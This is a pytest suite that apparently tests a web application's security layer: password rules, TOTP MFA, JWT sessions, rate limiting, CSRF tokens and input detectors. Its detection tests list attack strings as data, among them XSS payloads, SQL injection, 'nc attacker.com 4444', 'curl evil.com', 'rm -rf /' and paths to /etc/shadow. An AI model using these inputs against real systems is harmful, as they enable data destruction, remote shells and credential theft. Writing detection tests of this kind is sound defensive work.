"""
Comprehensive Security Testing Suite
Tests for authentication, authorization, input validation, and security middleware
"""

import pytest
import asyncio
import time
import jwt
import hashlib
import secrets
from datetime import datetime, timedelta, timezone
from unittest.mock import Mock, patch, MagicMock
import tempfile
import os
import json

# Import our security modules
import sys
sys.path.append(os.path.dirname(os.path.dirname(__file__)))

from security.authentication import (
    AuthenticationManager, User, UserRole, PasswordValidator, 
    MFAManager, SecurityConfig, AuthenticationError
)
from security.middleware import (
    SecurityMiddleware, InputSanitizer, RateLimiter, CSRFProtection,
    SecurityMonitor, SecurityEvent, ThreatType, SecurityLevel,
    RateLimitRule, SecurityError, SecurityViolation
)
from security.validation import (
    InputValidator, InputSanitizer as ValidationSanitizer, SchemaValidator,
    ValidationRule, DataType, ValidationError, CommonSchemas
)


class TestPasswordValidator:
    """Test password validation functionality"""
    
    def test_strong_password_validation(self):
        """Test strong password validation"""
        # Valid strong passwords
        strong_passwords = [
            "SecurePassword123!",
            "MyP@ssw0rd2024",
            "Complex#Pass9876",
            "Str0ng&Secure!2024"
        ]
        
        for password in strong_passwords:
            is_valid, errors = PasswordValidator.validate_password(password)
            assert is_valid, f"Password '{password}' should be valid, but got errors: {errors}"
    
    def test_weak_password_rejection(self):
        """Test weak password rejection"""
        # Weak passwords
        weak_passwords = [
            "password",           # Too common
            "12345678",          # No letters
            "abcdefgh",          # No numbers/special chars
            "Pass123",           # Too short
            "PASSWORD123!",      # No lowercase
            "password123!",      # No uppercase
            "Password!",         # No numbers
            "Password123",       # No special chars
            "aaaaaaaA1!",       # Repeated characters
            "abcdefgA1!",       # Sequential letters
            "1234567A!",        # Sequential numbers
        ]
        
        for password in weak_passwords:
            is_valid, errors = PasswordValidator.validate_password(password)
            assert not is_valid, f"Password '{password}' should be invalid"
            assert len(errors) > 0, f"Password '{password}' should have validation errors"
    
    def test_password_strength_calculation(self):
        """Test password strength scoring"""
        test_cases = [
            ("password", "Very Weak"),
            ("Password123", "Moderate"),
            ("SecurePassword123!", "Very Strong"),
            ("MyComplex&Password2024", "Very Strong")
        ]
        
        for password, expected_strength in test_cases:
            result = PasswordValidator.calculate_strength(password)
            assert result["strength"] == expected_strength, \
                f"Password '{password}' should have strength '{expected_strength}', got '{result['strength']}'"


class TestMFAManager:
    """Test Multi-Factor Authentication functionality"""
    
    def test_secret_generation(self):
        """Test TOTP secret generation"""
        secret = MFAManager.generate_secret()
        assert len(secret) == 32, "TOTP secret should be 32 characters long"
        assert secret.isalnum(), "TOTP secret should be alphanumeric"
    
    def test_qr_code_generation(self):
        """Test QR code generation"""
        secret = MFAManager.generate_secret()
        qr_code = MFAManager.generate_qr_code("test@example.com", secret)
        
        assert len(qr_code) > 0, "QR code should not be empty"
        # Should be valid base64
        import base64
        try:
            base64.b64decode(qr_code)
        except Exception:
            pytest.fail("QR code should be valid base64")
    
    def test_totp_verification(self):
        """Test TOTP token verification"""
        secret = MFAManager.generate_secret()
        
        # Generate a valid token
        import pyotp
        totp = pyotp.TOTP(secret)
        valid_token = totp.now()
        
        # Test valid token
        assert MFAManager.verify_totp(secret, valid_token), "Valid TOTP token should be accepted"
        
        # Test invalid token
        invalid_token = "000000"
        assert not MFAManager.verify_totp(secret, invalid_token), "Invalid TOTP token should be rejected"
    
    def test_backup_codes_generation(self):
        """Test backup codes generation"""
        backup_codes = MFAManager.generate_backup_codes(10)
        
        assert len(backup_codes) == 10, "Should generate requested number of backup codes"
        assert all(len(code) == 8 for code in backup_codes), "Backup codes should be 8 characters long"
        assert len(set(backup_codes)) == 10, "All backup codes should be unique"


class TestAuthenticationManager:
    """Test authentication manager functionality"""
    
    @pytest.fixture
    def auth_manager(self):
        """Create authentication manager for testing"""
        return AuthenticationManager(secret_key="test-secret-key-for-testing")
    
    @pytest.fixture
    def mock_db_manager(self):
        """Create mock database manager"""
        db_mock = Mock()
        db_mock.get_user_by_username.return_value = None
        db_mock.get_user_by_email.return_value = None
        db_mock.create_user.return_value = True
        db_mock.update_user.return_value = True
        return db_mock
    
    def test_password_hashing(self, auth_manager):
        """Test password hashing and verification"""
        password = "TestPassword123!"
        hashed = auth_manager.hash_password(password)
        
        assert hashed != password, "Password should be hashed"
        assert auth_manager.verify_password(password, hashed), "Password verification should work"
        assert not auth_manager.verify_password("wrong_password", hashed), "Wrong password should fail"
    
    def test_user_creation(self, auth_manager, mock_db_manager):
        """Test user creation with validation"""
        auth_manager.db_manager = mock_db_manager
        
        # Valid user creation
        user = auth_manager.create_user(
            username="testuser",
            email="test@example.com",
            password="SecurePassword123!",
            role=UserRole.ANALYST
        )
        
        assert user.username == "testuser"
        assert user.email == "test@example.com"
        assert user.role == UserRole.ANALYST
        assert user.password_hash != "SecurePassword123!"
        
        # Test weak password rejection
        with pytest.raises(AuthenticationError):
            auth_manager.create_user(
                username="testuser2",
                email="test2@example.com",
                password="weak",
                role=UserRole.VIEWER
            )
    
    def test_user_authentication(self, auth_manager, mock_db_manager):
        """Test user authentication flow"""
        auth_manager.db_manager = mock_db_manager
        
        # Create a test user
        user = User(
            id="test-user-id",
            username="testuser",
            email="test@example.com",
            password_hash=auth_manager.hash_password("SecurePassword123!"),
            role=UserRole.ANALYST
        )
        
        mock_db_manager.get_user_by_username.return_value = user
        mock_db_manager.get_user_by_email.return_value = user
        
        # Test successful authentication
        success, result = auth_manager.authenticate_user(
            "testuser", 
            "SecurePassword123!",
            ip_address="192.168.1.1",
            user_agent="Test Agent"
        )
        
        assert success, "Authentication should succeed"
        assert "access_token" in result, "Should return access token"
        assert "refresh_token" in result, "Should return refresh token"
        assert result["user"]["username"] == "testuser"
        
        # Test failed authentication
        success, result = auth_manager.authenticate_user("testuser", "wrong_password")
        assert not success, "Authentication should fail with wrong password"
        assert "error" in result, "Should return error message"
    
    def test_token_verification(self, auth_manager):
        """Test JWT token verification"""
        # Create a test user
        user = User(
            id="test-user-id",
            username="testuser",
            email="test@example.com",
            password_hash="dummy_hash",
            role=UserRole.ANALYST
        )
        
        # Generate token
        access_token = auth_manager._generate_access_token(user)
        
        # Create session
        from security.authentication import SessionToken
        session = SessionToken(
            token=access_token,
            user_id=user.id,
            issued_at=datetime.now(timezone.utc),
            expires_at=datetime.now(timezone.utc) + timedelta(minutes=30),
            ip_address="192.168.1.1",
            user_agent="Test Agent"
        )
        auth_manager.active_sessions[access_token] = session
        
        # Test valid token
        is_valid, payload = auth_manager.verify_token(access_token)
        assert is_valid, "Valid token should be accepted"
        assert payload["username"] == "testuser"
        
        # Test invalid token
        is_valid, payload = auth_manager.verify_token("invalid_token")
        assert not is_valid, "Invalid token should be rejected"
    
    def test_mfa_enable_and_verify(self, auth_manager, mock_db_manager):
        """Test MFA enable and verification"""
        auth_manager.db_manager = mock_db_manager
        
        # Create test user
        user = User(
            id="test-user-id",
            username="testuser",
            email="test@example.com",
            password_hash="dummy_hash",
            role=UserRole.ANALYST
        )
        
        mock_db_manager.get_user_by_id.return_value = user
        
        # Enable MFA
        success, mfa_data = auth_manager.enable_mfa(user.id)
        assert success, "MFA enable should succeed"
        assert "secret" in mfa_data, "Should return MFA secret"
        assert "qr_code" in mfa_data, "Should return QR code"
        assert "backup_codes" in mfa_data, "Should return backup codes"
        
        # Verify MFA setup
        import pyotp
        totp = pyotp.TOTP(mfa_data["secret"])
        valid_token = totp.now()
        
        verify_success = auth_manager.verify_mfa_setup(user.id, valid_token)
        assert verify_success, "MFA verification should succeed with valid token"


class TestInputSanitizer:
    """Test input sanitization functionality"""
    
    def test_xss_detection(self):
        """Test XSS pattern detection"""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src='x' onerror='alert(1)'>",
            "<iframe src='evil.com'></iframe>",
            "onload=alert('xss')",
            "<style>body{background:url('javascript:alert(1)')}</style>"
        ]
        
        for xss_input in xss_inputs:
            threats = InputSanitizer.detect_threats(xss_input)
            xss_threats = [t for t in threats if t[0] == ThreatType.XSS]
            assert len(xss_threats) > 0, f"Should detect XSS in: {xss_input}"
    
    def test_sql_injection_detection(self):
        """Test SQL injection detection"""
        sql_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "admin'; DELETE FROM users; --",
            "1'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for sql_input in sql_inputs:
            threats = InputSanitizer.detect_threats(sql_input)
            sql_threats = [t for t in threats if t[0] == ThreatType.SQL_INJECTION]
            assert len(sql_threats) > 0, f"Should detect SQL injection in: {sql_input}"
    
    def test_command_injection_detection(self):
        """Test command injection detection"""
        cmd_inputs = [
            "; rm -rf /",
            "| nc attacker.com 4444",
            "$(curl evil.com)",
            "`whoami`",
            "&& cat /etc/passwd"
        ]
        
        for cmd_input in cmd_inputs:
            threats = InputSanitizer.detect_threats(cmd_input)
            cmd_threats = [t for t in threats if t[0] == ThreatType.COMMAND_INJECTION]
            assert len(cmd_threats) > 0, f"Should detect command injection in: {cmd_input}"
    
    def test_directory_traversal_detection(self):
        """Test directory traversal detection"""
        traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/shadow",
            "\\windows\\system32\\config\\sam"
        ]
        
        for traversal_input in traversal_inputs:
            threats = InputSanitizer.detect_threats(traversal_input)
            traversal_threats = [t for t in threats if t[0] == ThreatType.DIRECTORY_TRAVERSAL]
            assert len(traversal_threats) > 0, f"Should detect directory traversal in: {traversal_input}"


class TestRateLimiter:
    """Test rate limiting functionality"""
    
    @pytest.fixture
    def rate_limiter(self):
        """Create rate limiter for testing"""
        limiter = RateLimiter()
        rule = RateLimitRule(
            name="test_rule",
            max_requests=5,
            time_window=60,
            block_duration=300
        )
        limiter.add_rule(rule)
        return limiter
    
    def test_rate_limiting_basic(self, rate_limiter):
        """Test basic rate limiting"""
        identifier = "test_ip"
        rule_name = "test_rule"
        
        # First 5 requests should be allowed
        for i in range(5):
            allowed, info = rate_limiter.check_rate_limit(identifier, rule_name)
            assert allowed, f"Request {i+1} should be allowed"
            assert info["remaining"] == 4 - i, "Remaining count should decrease"
        
        # 6th request should be blocked
        allowed, info = rate_limiter.check_rate_limit(identifier, rule_name)
        assert not allowed, "6th request should be blocked"
        assert info["blocked"], "Should indicate blocking"
    
    def test_rate_limiting_time_window(self, rate_limiter):
        """Test rate limiting time window"""
        identifier = "test_ip"
        rule_name = "test_rule"
        
        # Make 5 requests (reaching limit)
        for _ in range(5):
            rate_limiter.check_rate_limit(identifier, rule_name)
        
        # Next request should be blocked
        allowed, info = rate_limiter.check_rate_limit(identifier, rule_name)
        assert not allowed, "Should be blocked after reaching limit"
        
        # Simulate time passing (mock datetime)
        with patch('security.middleware.datetime') as mock_datetime:
            future_time = datetime.now(timezone.utc) + timedelta(minutes=2)
            mock_datetime.now.return_value = future_time
            
            # Request should be allowed after time window
            allowed, info = rate_limiter.check_rate_limit(identifier, rule_name, future_time)
            assert allowed, "Should be allowed after time window expires"


class TestCSRFProtection:
    """Test CSRF protection functionality"""
    
    @pytest.fixture
    def csrf_protection(self):
        """Create CSRF protection for testing"""
        return CSRFProtection(secret_key="test-csrf-secret")
    
    def test_token_generation_and_verification(self, csrf_protection):
        """Test CSRF token generation and verification"""
        session_id = "test_session_123"
        
        # Generate token
        token = csrf_protection.generate_token(session_id)
        assert len(token) > 0, "Token should not be empty"
        
        # Verify valid token
        is_valid = csrf_protection.verify_token(session_id, token)
        assert is_valid, "Valid token should be accepted"
        
        # Verify invalid token
        is_valid = csrf_protection.verify_token(session_id, "invalid_token")
        assert not is_valid, "Invalid token should be rejected"
        
        # Verify with wrong session
        is_valid = csrf_protection.verify_token("wrong_session", token)
        assert not is_valid, "Token should not be valid for different session"
    
    def test_token_expiration(self, csrf_protection):
        """Test CSRF token expiration"""
        session_id = "test_session_123"
        token = csrf_protection.generate_token(session_id)
        
        # Mock expired time
        with patch('security.middleware.datetime') as mock_datetime:
            future_time = datetime.now(timezone.utc) + timedelta(hours=25)
            mock_datetime.now.return_value = future_time
            
            is_valid = csrf_protection.verify_token(session_id, token)
            assert not is_valid, "Expired token should be rejected"


class TestSecurityMiddleware:
    """Test security middleware functionality"""
    
    @pytest.fixture
    def security_middleware(self):
        """Create security middleware for testing"""
        return SecurityMiddleware(secret_key="test-security-secret")
    
    def test_request_validation_safe(self, security_middleware):
        """Test safe request validation"""
        safe_request = {
            "ip_address": "192.168.1.1",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "path": "/api/data",
            "method": "GET",
            "headers": {"referer": "https://example.com"},
            "body": "{'query': 'safe data'}",
            "params": {"page": "1", "limit": "10"}
        }
        
        is_safe, events = security_middleware.validate_request(safe_request)
        assert is_safe, "Safe request should be validated"
        threat_events = [e for e in events if e.blocked]
        assert len(threat_events) == 0, "No threats should be detected"
    
    def test_request_validation_malicious(self, security_middleware):
        """Test malicious request detection"""
        malicious_request = {
            "ip_address": "192.168.1.100",
            "user_agent": "Mozilla/5.0",
            "path": "/api/search",
            "method": "POST",
            "headers": {},
            "body": "<script>alert('xss')</script>",
            "params": {"query": "'; DROP TABLE users; --"}
        }
        
        is_safe, events = security_middleware.validate_request(malicious_request)
        assert not is_safe, "Malicious request should be blocked"
        
        threat_events = [e for e in events if e.blocked]
        assert len(threat_events) > 0, "Threats should be detected and blocked"
        
        # Check for specific threat types
        threat_types = [e.threat_type for e in events]
        assert ThreatType.XSS in threat_types, "XSS should be detected"
        assert ThreatType.SQL_INJECTION in threat_types, "SQL injection should be detected"
    
    def test_input_sanitization(self, security_middleware):
        """Test input sanitization"""
        # HTML sanitization
        html_input = "<script>alert('xss')</script><p>Safe content</p>"
        sanitized = security_middleware.sanitize_input(html_input, "html")
        assert "<script>" not in sanitized, "Script tags should be removed"
        assert "Safe content" in sanitized, "Safe content should be preserved"
        
        # SQL sanitization
        sql_input = "'; DROP TABLE users; --"
        sanitized = security_middleware.sanitize_input(sql_input, "sql")
        assert "DROP TABLE" not in sanitized.upper(), "Dangerous SQL should be removed"
        
        # Email validation
        valid_email = "test@example.com"
        sanitized = security_middleware.sanitize_input(valid_email, "email")
        assert sanitized == valid_email, "Valid email should pass through"
        
        invalid_email = "not_an_email"
        sanitized = security_middleware.sanitize_input(invalid_email, "email")
        assert sanitized is None, "Invalid email should be rejected"
    
    def test_security_headers(self, security_middleware):
        """Test security headers generation"""
        headers = security_middleware.get_security_headers()
        
        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "Referrer-Policy"
        ]
        
        for header in required_headers:
            assert header in headers, f"Required security header {header} should be present"
        
        # Check specific values
        assert headers["X-Frame-Options"] == "DENY"
        assert "nosniff" in headers["X-Content-Type-Options"]
        assert "max-age" in headers["Strict-Transport-Security"]


class TestInputValidator:
    """Test comprehensive input validation"""
    
    def test_email_validation(self):
        """Test email validation"""
        valid_emails = [
            "test@example.com",
            "user.name+tag@domain.co.uk", 
            "firstname.lastname@subdomain.domain.com"
        ]
        
        invalid_emails = [
            "not_an_email",
            "@domain.com",
            "user@",
            "user..name@domain.com",
            "user@domain",
            "user name@domain.com"
        ]
        
        for email in valid_emails:
            rule = ValidationRule("email", DataType.EMAIL)
            result = InputValidator.validate_email(email, rule)
            assert result.is_valid, f"Email '{email}' should be valid"
        
        for email in invalid_emails:
            rule = ValidationRule("email", DataType.EMAIL)
            result = InputValidator.validate_email(email, rule)
            assert not result.is_valid, f"Email '{email}' should be invalid"
    
    def test_url_validation(self):
        """Test URL validation"""
        valid_urls = [
            "https://example.com",
            "http://subdomain.example.com/path",
            "https://example.com/path?param=value"
        ]
        
        invalid_urls = [
            "not_a_url",
            "ftp://example.com",  # Wrong scheme
            "http://localhost",   # Blocked domain
            "http://127.0.0.1",   # Blocked IP
            "javascript:alert(1)" # Dangerous scheme
        ]
        
        for url in valid_urls:
            rule = ValidationRule("url", DataType.URL)
            result = InputValidator.validate_url(url, rule)
            assert result.is_valid, f"URL '{url}' should be valid"
        
        for url in invalid_urls:
            rule = ValidationRule("url", DataType.URL)
            result = InputValidator.validate_url(url, rule)
            assert not result.is_valid, f"URL '{url}' should be invalid"
    
    def test_integer_validation(self):
        """Test integer validation"""
        rule = ValidationRule(
            "test_int", 
            DataType.INTEGER, 
            min_value=1, 
            max_value=100
        )
        
        # Valid integers
        valid_values = [1, 50, 100, "25", "  75  "]
        for value in valid_values:
            result = InputValidator.validate_integer(value, rule)
            assert result.is_valid, f"Value '{value}' should be valid integer"
        
        # Invalid integers
        invalid_values = [0, 101, "not_a_number", 1.5, ""]
        for value in invalid_values:
            result = InputValidator.validate_integer(value, rule)
            assert not result.is_valid, f"Value '{value}' should be invalid integer"
    
    def test_json_validation(self):
        """Test JSON validation"""
        rule = ValidationRule("json_data", DataType.JSON)
        
        # Valid JSON
        valid_json = [
            '{"key": "value"}',
            '["item1", "item2"]',
            '{"nested": {"data": true}}',
            {"already": "parsed"},
            []
        ]
        
        for json_data in valid_json:
            result = InputValidator.validate_json(json_data, rule)
            assert result.is_valid, f"JSON '{json_data}' should be valid"
        
        # Invalid JSON
        invalid_json = [
            '{"invalid": json}',
            '{"unclosed": "string',
            'not json at all',
            '{"duplicate": 1, "duplicate": 2}'  # Technically valid but might be flagged
        ]
        
        for json_data in invalid_json[:3]:  # Skip the last one as it's technically valid
            result = InputValidator.validate_json(json_data, rule)
            assert not result.is_valid, f"JSON '{json_data}' should be invalid"


class TestSchemaValidator:
    """Test schema-based validation"""
    
    @pytest.fixture
    def schema_validator(self):
        """Create schema validator for testing"""
        return SchemaValidator()
    
    def test_user_registration_schema(self, schema_validator):
        """Test user registration schema validation"""
        schema = CommonSchemas.user_registration()
        
        # Valid data
        valid_data = {
            "username": "john_doe",
            "email": "john@example.com", 
            "password": "SecurePass123!",
            "age": 25,
            "terms_accepted": True
        }
        
        results = schema_validator.validate_schema(valid_data, schema)
        assert all(result.is_valid for result in results.values()), "All fields should be valid"
        
        sanitized = schema_validator.get_sanitized_data(results)
        assert len(sanitized) == len(valid_data), "All fields should be sanitized"
        
        # Invalid data
        invalid_data = {
            "username": "jo",  # Too short
            "email": "not_an_email",
            "password": "weak",  # Weak password
            "age": 150,  # Too old
            "terms_accepted": False  # Must be true
        }
        
        results = schema_validator.validate_schema(invalid_data, schema)
        errors = schema_validator.get_errors(results)
        assert len(errors) > 0, "Should have validation errors"
        
        # Check specific errors
        assert "username" in errors, "Username should have validation error"
        assert "email" in errors, "Email should have validation error"
        assert "password" in errors, "Password should have validation error"
    
    def test_api_search_schema(self, schema_validator):
        """Test API search schema validation"""
        schema = CommonSchemas.api_search()
        
        # Valid search data
        valid_data = {
            "query": "business intelligence",
            "limit": 20,
            "offset": 0,
            "sort_by": "relevance",
            "filters": {"category": "technology", "date_range": "2024"}
        }
        
        results = schema_validator.validate_schema(valid_data, schema)
        assert all(result.is_valid for result in results.values()), "All search fields should be valid"
        
        # Invalid search data
        invalid_data = {
            "query": "",  # Empty query
            "limit": 1000,  # Too high
            "offset": -1,  # Negative
            "sort_by": "invalid_sort",  # Not in allowed values
            "filters": "not_json"  # Should be JSON
        }
        
        results = schema_validator.validate_schema(invalid_data, schema)
        errors = schema_validator.get_errors(results)
        assert len(errors) > 0, "Should have validation errors for search data"


class TestSecurityIntegration:
    """Integration tests for security components"""
    
    @pytest.fixture
    def full_security_stack(self):
        """Create full security stack for integration testing"""
        auth_manager = AuthenticationManager("test-secret")
        security_middleware = SecurityMiddleware("test-secret")
        schema_validator = SchemaValidator()
        
        return {
            "auth": auth_manager,
            "middleware": security_middleware,
            "validator": schema_validator
        }
    
    def test_secure_api_endpoint_simulation(self, full_security_stack):
        """Simulate a secure API endpoint with full security stack"""
        auth = full_security_stack["auth"]
        middleware = full_security_stack["middleware"]
        validator = full_security_stack["validator"]
        
        # 1. Create and authenticate user
        user = User(
            id="test-user",
            username="apiuser",
            email="api@example.com",
            password_hash=auth.hash_password("SecurePass123!"),
            role=UserRole.ANALYST
        )
        
        # 2. Generate access token
        access_token = auth._generate_access_token(user)
        
        # 3. Create session
        from security.authentication import SessionToken
        session = SessionToken(
            token=access_token,
            user_id=user.id,
            issued_at=datetime.now(timezone.utc),
            expires_at=datetime.now(timezone.utc) + timedelta(minutes=30),
            ip_address="192.168.1.1",
            user_agent="Test Client"
        )
        auth.active_sessions[access_token] = session
        
        # 4. Simulate API request
        request_data = {
            "ip_address": "192.168.1.1",
            "user_agent": "Test Client",
            "path": "/api/search",
            "method": "POST",
            "headers": {"Authorization": f"Bearer {access_token}"},
            "body": json.dumps({
                "query": "business data",
                "limit": 10,
                "sort_by": "relevance"
            }),
            "params": {}
        }
        
        # 5. Security validation
        is_safe, events = middleware.validate_request(request_data)
        assert is_safe, "Safe API request should pass security validation"
        
        # 6. Token verification
        is_valid, payload = auth.verify_token(access_token)
        assert is_valid, "Valid token should be verified"
        assert payload["username"] == "apiuser"
        
        # 7. Input validation
        body_data = json.loads(request_data["body"])
        schema = CommonSchemas.api_search()
        results = validator.validate_schema(body_data, schema)
        assert all(result.is_valid for result in results.values()), "API input should be valid"
        
        # This simulates a complete secure API request flow
        print("✅ Secure API endpoint simulation passed all security checks")
    
    def test_attack_simulation(self, full_security_stack):
        """Simulate various attack scenarios"""
        middleware = full_security_stack["middleware"]
        
        # SQL Injection attack
        sql_attack = {
            "ip_address": "192.168.1.100",
            "user_agent": "AttackBot/1.0",
            "path": "/api/search",
            "method": "POST",
            "headers": {},
            "body": "'; DROP TABLE users; --",
            "params": {"id": "1' OR '1'='1"}
        }
        
        is_safe, events = middleware.validate_request(sql_attack)
        assert not is_safe, "SQL injection attack should be blocked"
        sql_events = [e for e in events if e.threat_type == ThreatType.SQL_INJECTION]
        assert len(sql_events) > 0, "SQL injection should be detected"
        
        # XSS attack
        xss_attack = {
            "ip_address": "192.168.1.101",
            "user_agent": "AttackBot/1.0",
            "path": "/api/comment",
            "method": "POST",
            "headers": {},
            "body": "<script>alert('xss')</script>",
            "params": {}
        }
        
        is_safe, events = middleware.validate_request(xss_attack)
        assert not is_safe, "XSS attack should be blocked"
        xss_events = [e for e in events if e.threat_type == ThreatType.XSS]
        assert len(xss_events) > 0, "XSS should be detected"
        
        print("✅ Attack simulation - all attacks properly detected and blocked")


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "--tb=short"])
